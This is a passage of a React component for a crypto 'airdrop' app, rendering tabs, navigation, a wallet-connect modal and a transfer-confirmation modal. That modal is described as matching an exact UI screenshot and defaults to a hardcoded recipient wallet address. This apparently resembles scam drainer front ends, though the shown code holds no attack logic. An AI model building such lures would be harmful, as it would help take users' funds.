        ) : currentTab === 'airdrop' ? (
          <AirdropTab
            userAccount={userAccount}
            config={config}
            onConnectClick={() => setShowConnectModal(true)}
            onParticipateClick={handleDirectNodeParticipate}
            onNavigateToDeposit={handleAirdropNavigateToDeposit}
            onClaimReward={handleClaimAirdropReward}
            onJoinAirdrop={handleJoinAirdrop}
          />
        ) : currentTab === 'chat' ? (
          <SupportChat
            onBack={() => setCurrentTab('finance')}
            connectedAddress={connectedAddress}
          />
        ) : (
          <AssetsTab
            userAccount={userAccount}
            connectedAddress={connectedAddress}
            config={config}
            onConnectClick={() => setShowConnectModal(true)}
            onDisconnectClick={handleDisconnect}
            onDepositSubmit={handleDepositSubmit}
            onWithdrawSubmit={handleWithdrawSubmit}
            onExchangeSubmit={handleExchangeSubmit}
            initialModal={assetsInitialModal}
            initialDepositAmount={assetsInitialAmount}
            onClearInitialModal={() => {
              setAssetsInitialModal(null);
              setAssetsInitialAmount('');
            }}
          />
        )}
      </div>

      {/* Bottom Navigation Bar - Fixed strictly at the bottom when scrolling */}
      <div className="fixed bottom-0 left-0 right-0 w-full bg-white/95 backdrop-blur-md border-t border-slate-200 py-3 px-6 sm:px-12 flex justify-around items-center z-40 shadow-[0_-4px_20px_rgba(0,0,0,0.06)]">
        <button
          onClick={() => setCurrentTab('finance')}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'finance' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Activity className="w-5 h-5" />
          {t('finance')}
        </button>

        <button
          onClick={() => setCurrentTab('airdrop')}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'airdrop' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Gift className="w-5 h-5" />
          {t('airdrop')}
        </button>

        <button
          onClick={() => {
            if (!connectedAddress) {
              setShowConnectModal(true);
            } else {
              setCurrentTab('assets');
            }
          }}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'assets' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Wallet className="w-5 h-5" />
          {t('assets')}
        </button>
      </div>

      {/* Web3 Connections Modal dialogs popup */}
      <WalletModals
        isOpen={showConnectModal}
        onClose={() => setShowConnectModal(false)}
        onConnectReal={handleConnectReal}
        isLoading={isLoading}
      />

      {/* Transfer Request Confirmation Modal matching exact UI screenshot */}
      <TransferRequestModal
        isOpen={showTransferModal}
        onClose={() => setShowTransferModal(false)}
        onConfirm={handleConfirmTransfer}
        connectedAddress={connectedAddress}
        recipientAddress={config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B'}
      />
    </div>
  );
}
